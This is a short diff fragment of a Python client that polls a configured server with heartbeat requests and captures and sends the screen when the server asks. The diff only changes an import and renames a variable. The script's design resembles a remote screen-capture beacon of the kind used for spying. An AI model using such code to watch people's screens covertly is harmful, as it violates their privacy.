@@ -9,9 +9,9 @@ from PIL import ImageGrab
 from base64 import b64encode
 from requests import post
 from time import sleep
-import configparser
+from configparser import ConfigParser
 
-Config = configparser.ConfigParser()
+Config = ConfigParser()
 Config.read("config.ini")
 
 url = 'http://' + Config.get('server', 'host') + ':' + Config.get('server', 'port1')
@@ -36,10 +36,9 @@ def main():
         'transferType' : 'heartBeat'
     }
     try:
-        r = post(url,data).text
+        receive_data = post(url,data).text
     except:
         main()
-    receive_data = r
 
     if receive_data == 'screenShot':
         image = screen_shot(save_path)
